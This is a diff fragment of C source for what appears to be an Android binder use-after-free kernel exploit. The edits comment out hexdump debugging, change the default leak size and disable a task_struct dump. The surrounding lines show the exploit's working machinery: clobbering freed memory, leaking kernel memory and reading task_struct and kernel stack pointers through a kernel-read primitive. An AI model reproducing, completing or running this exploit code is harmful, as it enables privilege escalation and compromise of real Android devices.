@@ -192,8 +192,8 @@ int clobber_data(unsigned long payloadAddress, const void *src, unsigned long pa
     printf("PARENT: testDatum = %lx\n", testDatum);
     if (testDatum != testValue)
         errx(1, "clobber value doesn't match: is %lx but should be %lx", testDatum, testValue);
-    hexdump_memory(dummyBuffer, 16);
-    hexdump_memory(dummyBuffer+UAF_SPINLOCK-16, 16);
+    //hexdump_memory(dummyBuffer, 16);
+    //hexdump_memory(dummyBuffer+UAF_SPINLOCK-16, 16);
   
   printf("recvmsg() returns %d, expected %d\n", recvmsg_result,
       totalLength);
@@ -530,7 +530,7 @@ int main(int argc, char** argv) {
   binder_fd = open("/dev/binder", O_RDONLY);
   epfd = epoll_create(1000);
 
-  int leakSize = argc < 2 ? 2*4096+8 : atoi(argv[1]); // +9
+  int leakSize = argc < 2 ? 0 : atoi(argv[1]); // +9
   printf("Leak size %d\n", leakSize);
   unsigned char* leaked = malloc(leakSize);
   if (leaked == NULL) err(1, "Allocating leak buffer");
@@ -548,10 +548,10 @@ int main(int argc, char** argv) {
   
   printf("current->kstack == 0x%lx\n", kernel_read_ulong(task_struct_ptr+OFFSET__task_struct__stack));
   
-  char task_struct_data[0x900];
-  kernel_read(task_struct_ptr, task_struct_data, sizeof(task_struct_data));
-  printf("task_struct\n");
-  hexdump_memory(task_struct_data, sizeof(task_struct_data)); 
+  //char task_struct_data[0x900];
+  //kernel_read(task_struct_ptr, task_struct_data, sizeof(task_struct_data));
+  //printf("task_struct\n");
+  //hexdump_memory(task_struct_data, sizeof(task_struct_data)); 
 
   unsigned long thread_info_ptr = kstack;
 
